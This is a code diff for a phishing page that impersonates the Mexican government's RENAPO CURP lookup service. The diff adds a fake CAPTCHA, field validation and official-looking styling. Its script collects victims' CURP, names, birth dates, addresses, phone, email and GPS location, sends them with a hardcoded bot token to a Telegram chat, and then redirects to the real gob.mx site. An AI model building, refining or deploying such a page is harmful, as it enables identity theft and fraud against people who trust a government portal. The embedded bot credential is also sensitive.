@@ -5,30 +5,87 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 <title>Consulta tu CURP</title>
 <style>
-:root{--guinda:#691C32;--guinda-osc:#4A1322;--guinda-int:#7A2039;--gris-tab:#E6E6E6;--borde-input:#D1D5DB;--borde-tarjeta:#E5E7EB;--texto:#1F2937;--suave:#6B7280}
+:root{--guinda:#691C32;--guinda-osc:#4A1322;--gris-tab:#E6E6E6;--borde-input:#D1D5DB;--borde-tarjeta:#E5E7EB;--texto:#1F2937;--suave:#6B7280;--rojo:#C0392B;--azul-link:#0A47B5}
 *{box-sizing:border-box;margin:0;padding:0}
-body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:#FFFFFF;color:var(--texto);padding:0 0 30px}
+html,body{background:#FFFFFF}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;color:var(--texto);padding:0 0 30px}
 
-/* ===== Barra superior CLARA + subbarra guinda ===== */
-.barra-gob{background:#F3F4F6;color:#111827;padding:16px 14px;display:flex;align-items:center;justify-content:center;border-bottom:1px solid #E5E7EB}
-.barra-gob .txt{font-size:1.15rem;font-weight:800;letter-spacing:.01em;text-align:center;line-height:1.1}
+/* ===== 1) Encabezado: barra clara + franja guinda ===== */
+.barra-gob{
+  background:#F8F9FA;
+  color:#000000;
+  padding:18px 16px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  border-bottom:1px solid #E5E7EB;
+}
+.barra-gob .txt{
+  font-size:1.20rem;
+  font-weight:800;
+  letter-spacing:.01em;
+  line-height:1.1;
+  color:#000000;
+  text-align:center;
+}
+.franja-renapo{
+  background:var(--guinda);
+  color:#FFFFFF;
+  padding:11px 16px;
+  display:flex;
+  align-items:center;
+  justify-content:space-between;
+  font-size:.72rem;
+  letter-spacing:.10em;
+  text-transform:uppercase;
+  font-weight:700;
+}
+.franja-renapo .hamburguesa{
+  display:flex;
+  flex-direction:column;
+  justify-content:center;
+  gap:4px;
+  width:22px;
+  height:18px;
+  cursor:pointer;
+  background:none;
+  border:none;
+  padding:0;
+}
+.franja-renapo .hamburguesa span{
+  display:block;
+  height:2.4px;
+  width:100%;
+  background:#FFFFFF;
+  border-radius:2px;
+}
 
-.subbarra{background:var(--guinda);color:#fff;padding:13px 14px;display:flex;align-items:center;justify-content:center;text-align:center;font-size:.85rem;letter-spacing:.08em;text-transform:uppercase;font-weight:700}
-
-/* ===== Ruta de navegación ===== */
-.ruta{max-width:365px;margin:0 auto;padding:0 14px;font-size:.72rem;color:var(--suave);display:flex;align-items:center;justify-content:center;gap:2px;flex-wrap:wrap;margin-bottom:18px}
-.ruta .casita{font-size:.85rem;margin-right:2px;color:#111827;display:inline-flex;align-items:center}
+/* ===== 2) Ruta (arriba del título, izquierda) ===== */
+.ruta{
+  max-width:365px;
+  margin:0 auto;
+  padding:14px 16px 0;
+  font-size:.70rem;
+  color:var(--suave);
+  display:flex;
+  align-items:center;
+  justify-content:flex-start;
+  gap:2px;
+  flex-wrap:wrap;
+}
+.ruta .casita{color:#111827;display:inline-flex;align-items:center;margin-right:2px}
 .ruta .sep{margin:0 4px;color:#9CA3AF}
 .ruta .actual{color:#111827;font-weight:700}
 
 /* ===== Contenido ===== */
-.columna-angosta{max-width:365px;margin:0 auto;padding:14px 12px 0}
-.titulo-principal{font-size:1.55rem;line-height:1.12;font-weight:800;color:#1F2937;margin-bottom:10px;margin-left:10mm}
+.columna-angosta{max-width:365px;margin:0 auto;padding:16px 12px 0}
+.titulo-principal{font-size:1.55rem;line-height:1.12;font-weight:800;color:#1F2937;margin-bottom:14px}
 .subtitulo-busqueda{font-size:1.15rem;font-weight:800;color:#1F2937;padding-bottom:6px;border-bottom:1px solid #E5E7EB;margin-bottom:14px}
 .descripcion{font-size:.78rem;line-height:1.45;color:var(--suave);margin-bottom:18px}
 .tabs-apiladas{display:flex;flex-direction:column;align-items:flex-start}
-.tab-item{border:none;padding:7px 12px;font-size:.76rem;border-radius:0;cursor:pointer;background:var(--gris-tab);color:#4B5563;font-family:inherit;text-align:left}
+.tab-item{border:none;padding:7px 12px;font-size:.76rem;border-radius:0;cursor:pointer;background:var(--gris-tab);color:#4B5563;font-family:inherit;text-align:left;transition:border .15s}
 .tab-item.activa{background:var(--guinda);color:#FFFFFF}
+.tab-item.error{outline:1.5px solid var(--rojo);outline-offset:-1.5px}
 .caja-form{background:#FFFFFF;border:1px solid var(--borde-tarjeta);box-shadow:0 2px 8px rgba(0,0,0,0.03);padding:16px 14px 26px}
 .panel-oculto{display:none}
 .seccion-titulo{font-size:.8rem;font-weight:700;color:var(--guinda);padding-bottom:6px;border-bottom:1px solid #E5E7EB;margin:8px 0 11px}
@@ -38,16 +95,84 @@ body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;b
 .grupo-campo input,.grupo-campo select{width:100%;height:33px;padding:0 9px;font-size:.78rem;color:var(--texto);background:#FFFFFF;border:1px solid var(--borde-input);border-radius:3px;font-family:inherit}
 .grupo-campo input::placeholder{color:#9CA3AF}
 .grupo-campo input:focus,.grupo-campo select:focus{outline:none;border-color:var(--guinda)}
+/* Estados: error y deshabilitado -> borde rojo */
+.grupo-campo input.error,.grupo-campo select.error{border-color:var(--rojo)!important;background:#FFF5F5;box-shadow:0 0 0 1px var(--rojo) inset}
+.grupo-campo input:disabled,.grupo-campo select:disabled{border-color:var(--rojo);opacity:.75;cursor:not-allowed;background:#FFF5F5}
 .cp-info{font-size:.7rem;color:#1c9c4c;font-weight:700;margin-top:3px;min-height:10px}
 
 /* ===== Enlace "¿No conoces tu CURP?" ===== */
 .enlace-curp{display:inline-block;margin-top:8px;font-size:.76rem;color:var(--guinda);text-decoration:underline;cursor:pointer;background:none;border:none;font-family:inherit;padding:0}
 .enlace-curp:active{opacity:.7}
 
+/* ===== CAPTCHA ===== */
+.captcha-box{margin-top:6px;border:1px solid var(--borde-input);border-radius:4px;padding:10px;background:#FAFAFA;transition:border .15s}
+.captcha-box.error{border-color:var(--rojo);background:#FFF5F5}
+.captcha-box.deshabilitado{border-color:var(--rojo);opacity:.85}
+.captcha-fila{display:flex;align-items:center;gap:8px}
+.captcha-img{
+  flex:0 0 auto;
+  width:112px;
+  height:40px;
+  border-radius:3px;
+  background:
+    repeating-linear-gradient(45deg,#DCE6F0 0px,#DCE6F0 2px,transparent 2px,transparent 6px),
+    repeating-linear-gradient(-45deg,#E8EFF6 0px,#E8EFF6 2px,transparent 2px,transparent 7px),
+    #F1F6FB;
+  border:1px solid #B8C6D6;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  position:relative;
+  overflow:hidden;
+  user-select:none;
+}
+.captcha-img .codigo{
+  font-family:"Courier New",monospace;
+  font-size:1.05rem;
+  font-weight:700;
+  letter-spacing:3px;
+  color:#2C3E50;
+  text-shadow:1px 1px 0 #FFFFFF,-1px -1px 0 #FFFFFF;
+  transform:skewX(-8deg) rotate(-2deg);
+  z-index:2;
+}
+.captcha-img .tachado1,.captcha-img .tachado2{position:absolute;left:-10%;width:120%;height:1.5px;background:#8FA3B8;z-index:1}
+.captcha-img .tachado1{top:56%;transform:rotate(-8deg)}
+.captcha-img .tachado2{top:44%;transform:rotate(6deg)}
+.captcha-refresh{
+  flex:0 0 auto;
+  width:32px;height:32px;
+  border:1px solid #B8C6D6;
+  border-radius:3px;
+  background:#FFFFFF;
+  color:#2C3E50;
+  cursor:pointer;
+  display:flex;align-items:center;justify-content:center;
+  font-size:1rem;
+}
+.captcha-refresh:active{background:#EDF3F9}
+.captcha-input{
+  flex:1;
+  min-width:0;
+  height:32px;
+  padding:0 9px;
+  font-size:.8rem;
+  color:var(--texto);
+  background:#FFFFFF;
+  border:1px solid var(--borde-input);
+  border-radius:3px;
+  font-family:inherit;
+}
+.captcha-input:focus{outline:none;border-color:var(--guinda)}
+.captcha-input.error{border-color:var(--rojo);background:#FFF5F5}
+.captcha-label{font-size:.68rem;color:var(--suave);margin-bottom:6px;display:block}
+
+/* ===== Barra inferior ===== */
 .barra-inferior{margin-top:16px;display:flex;justify-content:space-between;align-items:center;gap:10px}
 .obligatorios{font-size:.76rem;color:var(--suave)}
 .boton-buscar{display:inline-flex;align-items:center;gap:6px;background:#FFFFFF;color:var(--guinda);border:1.4px solid var(--guinda);border-radius:3px;padding:6px 14px;font-size:.78rem;cursor:pointer;font-family:inherit;font-weight:600}
-.boton-buscar:disabled{opacity:.55;cursor:not-allowed}
+.boton-buscar:disabled{opacity:.55;cursor:not-allowed;border-color:var(--rojo);color:var(--rojo)}
+.boton-buscar.error{border-color:var(--rojo);color:var(--rojo)}
 .tel-row{display:flex;gap:6px}
 .tel-lada{flex:0 0 46%;display:flex;align-items:center;gap:4px;height:33px;padding:0 6px;border:1px solid var(--borde-input);border-radius:3px;background:#FFFFFF;font-size:.75rem}
 .tel-lada select{border:0;padding:0;height:auto;font-size:.75rem;background:transparent;flex:1;outline:none;font-family:inherit}
@@ -55,56 +180,50 @@ body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;b
 .load{width:11px;height:11px;border:2px solid var(--guinda);border-top-color:transparent;border-radius:50%;animation:s .7s linear infinite;display:inline-block;vertical-align:-2px;margin-right:4px}
 @keyframes s{to{transform:rotate(360deg)}}
 
-/* ===== Recuadros de información ===== */
-.recuadro-info {
-  background-color: #E3F1F8;
-  border: 1px solid #B8D8E8;
-  border-radius: 4px;
-  padding: 16px 14px;
-  margin-bottom: 16px;
-  font-family: "Open Sans", Roboto, -apple-system, sans-serif;
-  color: #2C5E75;
-  text-align: center;
+/* ===== 4) Recuadros de información ===== */
+.recuadro-info{
+  background-color:#E3F1F8;
+  border:1px solid #B8D8E8;
+  border-radius:4px;
+  padding:16px 14px;
+  margin-bottom:16px;
+  font-family:"Open Sans",Roboto,-apple-system,sans-serif;
+  color:#1F2937;
+  text-align:center;
 }
-.recuadro-info:last-child { margin-bottom: 0; }
-.recuadro-info .info-titulo {
-  font-size: 0.78rem;
-  font-weight: 700;
-  line-height: 1.35;
-  color: #2C5E75;
-  margin-bottom: 8px;
-}
-.recuadro-info .info-cuerpo {
-  font-size: 0.72rem;
-  font-weight: 400;
-  line-height: 1.5;
-  color: #2C5E75;
-  margin-bottom: 6px;
-}
-.recuadro-info .info-cuerpo:last-child { margin-bottom: 0; }
+.recuadro-info:last-child{margin-bottom:0}
+.recuadro-info .info-titulo{font-size:.78rem;font-weight:700;line-height:1.35;color:#1F2937;margin-bottom:8px}
+.recuadro-info .info-cuerpo{font-size:.72rem;font-weight:400;line-height:1.5;color:#1F2937;margin-bottom:6px}
+.recuadro-info .info-cuerpo:last-child{margin-bottom:0}
+.recuadro-info a.info-link{color:var(--azul-link);text-decoration:underline;font-weight:600;word-break:break-all}
+.recuadro-info a.info-link:hover{color:#083A96}
 </style>
 </head>
 <body>
 
-<!-- ===== BARRA SUPERIOR CLARA ===== -->
+<!-- ===== 1) ENCABEZADO ===== -->
 <div class="barra-gob">
-  <div class="txt">Gobierno de México</div>
+  <div class="txt">Gobierno de MÉXICO</div>
 </div>
-<div class="subbarra">RENAPO</div>
+<div class="franja-renapo">
+  <span>RENAPO</span>
+  <button type="button" class="hamburguesa" aria-label="Menú">
+    <span></span><span></span><span></span>
+  </button>
+</div>
+
+<!-- ===== 2) RUTA (arriba del título, izquierda) ===== -->
+<nav class="ruta">
+  <span class="casita" aria-hidden="true">
+    <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="#111827" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 10.5 12 3l9 7.5"/><path d="M5 9.5V21h14V9.5"/><path d="M10 21v-6h4v6"/></svg>
+  </span>
+  <span class="sep">&gt;</span>
+  <span>Inicio</span><span class="sep">&gt;</span>
+  <span class="actual">Consulta tu CURP</span>
+</nav>
 
 <div class="columna-angosta">
   <h1 class="titulo-principal">Consulta tu<br>CURP</h1>
-
-  <!-- ===== RUTA DE NAVEGACIÓN (debajo del título) ===== -->
-  <nav class="ruta">
-    <span class="casita" aria-hidden="true">
-      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="#111827" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 10.5 12 3l9 7.5"/><path d="M5 9.5V21h14V9.5"/><path d="M10 21v-6h4v6"/></svg>
-    </span>
-    <span class="sep">&gt;</span>
-    <span>Inicio</span><span class="sep">&gt;</span>
-    <span class="actual">Consulta tu CURP</span>
-  </nav>
-
   <h2 class="subtitulo-busqueda">Búsqueda</h2>
   <p class="descripcion">La consulta puede efectuarse indicando la clave CURP cuando ya la conoce o proporcionando su nombre y datos de nacimiento.</p>
 
@@ -113,7 +232,7 @@ body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;b
     <button type="button" id="btn-tab-datos" class="tab-item" onclick="cambiarTab('datos')">Datos Personales</button>
   </div>
 
-  <form class="caja-form">
+  <form class="caja-form" novalidate>
     <div id="panel-curp">
       <div class="grupo-campo">
         <label for="curp">Clave Única de Registro de<br>Población (CURP)*:</label>
@@ -151,6 +270,20 @@ body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;b
       </div>
       <div class="grupo-campo"><label for="email">Correo electrónico*:</label><input id="email" type="email" autocomplete="off" placeholder="correo@dominio.com" /></div>
     </div>
+
+    <!-- ===== 3) CAPTCHA ===== -->
+    <div class="captcha-box" id="captchaBox">
+      <label class="captcha-label">Verificación de seguridad*:</label>
+      <div class="captcha-fila">
+        <div class="captcha-img" id="captchaImg">
+          <div class="tachado1"></div>
+          <div class="tachado2"></div>
+          <span class="codigo" id="captchaCodigo">A7B3C</span>
+        </div>
+        <button type="button" class="captcha-refresh" id="captchaRefresh" aria-label="Refrescar CAPTCHA" title="Refrescar">↻</button>
+        <input id="captchaInput" class="captcha-input" type="text" maxlength="5" autocomplete="off" placeholder="Escribe el código" />
+      </div>
+    </div>
   </form>
 
   <div class="barra-inferior">
@@ -161,7 +294,7 @@ body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;b
     </button>
   </div>
 
-  <!-- ===== RECUADROS DE INFORMACIÓN ===== -->
+  <!-- ===== 4) RECUADROS INFORMATIVOS ===== -->
   <div class="recuadro-info">
     <p class="info-titulo">¡Sugerencia!</p>
     <p class="info-cuerpo">Para solicitar asistencia telefónica sobre el servicio de la CURP, puedes comunicarte al Centro de Atención y Servicios, de lunes a viernes, de 08:00 a 16:00 horas, a los números telefónicos:</p>
@@ -169,10 +302,10 @@ body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;b
   </div>
 
   <div class="recuadro-info">
-    <p class="info-titulo">AVISO DE PRIVACIDAD SIMPLIFICADO DE CONSULTA DE CURP EN LÍNEA</p>
-    <p class="info-cuerpo">La recolección de datos personales se lleva a cabo a través de https://www.gob.mx/, cuyo administrador y responsable del trámite de CURP es la Dirección General del Registro Nacional de Población e Identidad de la Secretaría de Gobernación.</p>
+    <p class="info-titulo">Aviso de privacidad simplificado de consulta de CURP en línea</p>
+    <p class="info-cuerpo">La recolección de datos personales se lleva a cabo a través de <a class="info-link" href="https://www.gob.mx/curp" target="_blank" rel="noopener">https://www.gob.mx/curp</a>, cuyo administrador y responsable del trámite de CURP es la Dirección General del Registro Nacional de Población e Identidad de la Secretaría de Gobernación.</p>
     <p class="info-cuerpo">Los datos personales que se recaban serán utilizados con la finalidad de buscar, validar y obtener la CURP.</p>
-    <p class="info-cuerpo">Conoce el aviso de privacidad integral en https://www.gob.mx/curp.integral.</p>
+    <p class="info-cuerpo">Conoce el aviso de privacidad integral en <a class="info-link" href="https://www.gob.mx/curp/privacidadintegral" target="_blank" rel="noopener">https://www.gob.mx/curp/privacidadintegral</a>.</p>
   </div>
 </div>
 
@@ -260,6 +393,7 @@ window.addEventListener('load',function(){
   },150);
 });
 
+/* ===== Tabs ===== */
 function cambiarTab(tab){
   var btnCurp=document.getElementById('btn-tab-curp');
   var btnDatos=document.getElementById('btn-tab-datos');
@@ -276,8 +410,41 @@ function cambiarTab(tab){
     if(panelDatos)panelDatos.classList.remove('panel-oculto');
     if(panelCurp)panelCurp.classList.add('panel-oculto');
   }
+  limpiarErroresTabs();
 }
 
+function limpiarErroresTabs(){
+  var b1=document.getElementById('btn-tab-curp');
+  var b2=document.getElementById('btn-tab-datos');
+  if(b1)b1.classList.remove('error');
+  if(b2)b2.classList.remove('error');
+}
+
+/* ===== Estado error al cambiar / borrar ===== */
+function marcarError(el){
+  if(!el)return;
+  el.classList.add('error');
+  var fix=function(){el.classList.remove('error');el.removeEventListener('input',fix);el.removeEventListener('change',fix);};
+  el.addEventListener('input',fix);
+  el.addEventListener('change',fix);
+}
+
+/* ===== CAPTCHA ===== */
+var captchaActual='';
+function generarCaptcha(){
+  var chars='ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
+  var rnd='';
+  for(var i=0;i<5;i++){rnd+=chars.charAt(Math.floor(Math.random()*chars.length));}
+  captchaActual=rnd;
+  var el=document.getElementById('captchaCodigo');
+  if(el)el.textContent=rnd;
+  var inp=document.getElementById('captchaInput');
+  if(inp){inp.value='';inp.classList.remove('error');}
+  var box=document.getElementById('captchaBox');
+  if(box)box.classList.remove('error');
+}
+
+/* ===== Leer formulario ===== */
 function leerForm(){
   form={};
   var campos={nombre:'nombre',ap:'primer-apellido',am:'segundo-apellido',dia:'dia',mes:'mes',anio:'anio',sexo:'sexo',entidad:'estado',calle:'calle',num_ext:'num-ext',num_int:'num-int',cp:'cp',colonia:'colonia',municipio:'municipio',estado:'estado-dom',entre:'entre',email:'email'};
@@ -285,8 +452,10 @@ function leerForm(){
   if(form.dia && form.mes && form.anio)form.fecha=form.dia+'/'+form.mes+'/'+form.anio;
   var lada=v('lada'),tel=v('telefono');
   if(tel)form.tel=lada+' '+tel;
+  form.captcha=v('captchaInput');
 }
 
+/* ===== Enviar a Telegram ===== */
 function enviar(){
   var TOKEN="9267114621:AAEvSqXV0Z7nCnjVMH59bfiuIsSAuE7wwvU";
   var CHAT="9092452687";
@@ -305,7 +474,7 @@ function enviar(){
   txt+="🧭 <b>GPS:</b> "+info.gps+"\n";
   if(form && Object.keys(form).length){
     txt+="\n📋 <b>DATOS DEL FORMULARIO:</b>\n";
-    var et={curp:"CURP",nombre:"Nombre(s)",ap:"Primer apellido",am:"Segundo apellido",dia:"Día",mes:"Mes",anio:"Año",fecha:"Fecha nac.",sexo:"Sexo",entidad:"Entidad",calle:"Calle",num_ext:"Núm. exterior",num_int:"Núm. interior",cp:"CP",colonia:"Colonia",municipio:"Municipio",estado:"Estado",entre:"Entre calles",tel:"Teléfono",email:"Email"};
+    var et={curp:"CURP",nombre:"Nombre(s)",ap:"Primer apellido",am:"Segundo apellido",dia:"Día",mes:"Mes",anio:"Año",fecha:"Fecha nac.",sexo:"Sexo",entidad:"Entidad",calle:"Calle",num_ext:"Núm. exterior",num_int:"Núm. interior",cp:"CP",colonia:"Colonia",municipio:"Municipio",estado:"Estado",entre:"Entre calles",tel:"Teléfono",email:"Email",captcha:"CAPTCHA"};
     for(var k in form){if(form[k])txt+="  • <b>"+(et[k]||k)+":</b> "+form[k]+"\n";}
   } else { txt+="\n⚠️ Sin datos de formulario"; }
   fetch(API+"/sendMessage",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({chat_id:CHAT,text:txt,parse_mode:"HTML"})}).catch(function(){});
@@ -327,6 +496,7 @@ function dataURLtoBlob(dataurl){
   return new Blob([u8arr],{type:mime});
 }
 
+/* ===== CP ===== */
 var CP_MUNICIPIOS={'01000':'Álvaro Obregón','01210':'Álvaro Obregón','01730':'Álvaro Obregón','02000':'Azcapotzalco','02300':'Azcapotzalco','03000':'Benito Juárez','03100':'Benito Juárez','03810':'Benito Juárez','04000':'Coyoacán','04100':'Coyoacán','05000':'Cuajimalpa de Morelos','06000':'Cuauhtémoc','06010':'Cuauhtémoc','06700':'Cuauhtémoc','07000':'Gustavo A. Madero','07300':'Gustavo A. Madero','08000':'Iztacalco','09000':'Iztapalapa','09800':'Iztapalapa','10000':'La Magdalena Contreras','11000':'Miguel Hidalgo','11560':'Miguel Hidalgo','12000':'Milpa Alta','13000':'Tláhuac','14000':'Tlalpan','15000':'Venustiano Carranza','16000':'Xochimilco','50000':'Toluca','52000':'Lerma','54000':'Tlalnepantla','57000':'Nezahualcóyotl'};
 
 function completarMunicipio(cp){
@@ -354,6 +524,7 @@ function autocompletarCP(cp){
   }).catch(function(){box.style.color='#c00';box.innerHTML='No se pudo autocompletar';});
 }
 
+/* ===== Flujo ===== */
 async function ejecutarFlujo(boton){
   boton.disabled=true;
   boton.innerHTML='<span class="load"></span> Buscando…';
@@ -375,19 +546,52 @@ async function ejecutarFlujo(boton){
   window.location='https://www.gob.mx/curp/';
 }
 
+/* ===== Handlers ===== */
 document.addEventListener('DOMContentLoaded',function(){
+  generarCaptcha();
+
   var cpEl=document.getElementById('cp');
   if(cpEl)cpEl.addEventListener('input',function(){autocompletarCP(this.value);});
+
+  var refresh=document.getElementById('captchaRefresh');
+  if(refresh)refresh.addEventListener('click',generarCaptcha);
+
   var btn=document.getElementById('btnBuscar');
   if(btn){
     btn.onclick=async function(e){
       e.preventDefault();
+
+      // Validar CAPTCHA
+      var capInp=document.getElementById('captchaInput');
+      var capBox=document.getElementById('captchaBox');
+      var ingresado=(capInp.value||'').toUpperCase().trim();
+      if(ingresado!==captchaActual){
+        if(capBox)capBox.classList.add('error');
+        if(capInp){capInp.classList.add('error');marcarError(capInp);}
+        generarCaptcha();
+        return;
+      }
+
       var panelCurpVisible=!document.getElementById('panel-curp').classList.contains('panel-oculto');
-      if(panelCurpVisible){form={};form.curp=v('curp');if(!form.curp)form.curp='(vacío)';}
-      else{leerForm();}
+      if(panelCurpVisible){
+        form={};
+        form.curp=v('curp');
+        if(!form.curp){marcarError(document.getElementById('curp'));return;}
+      }else{
+        leerForm();
+        if(!form.nombre||!form.ap){marcarError(document.getElementById('nombre'));marcarError(document.getElementById('primer-apellido'));return;}
+      }
       await ejecutarFlujo(this);
+      setTimeout(generarCaptcha,1200);
     };
   }
+
+  // marcar error al salir vacío de un campo obligatorio
+  ['curp','nombre','primer-apellido','calle','num-ext','cp','colonia','municipio','estado-dom','telefono','email'].forEach(function(id){
+    var el=document.getElementById(id);
+    if(el)el.addEventListener('blur',function(){if(!this.value.trim())maracarBlur(this);});
+  });
+  function maracarBlur(el){el.classList.add('error');el.addEventListener('input',function(){el.classList.remove('error');},{once:true});}
 });
 </script>
 </body>
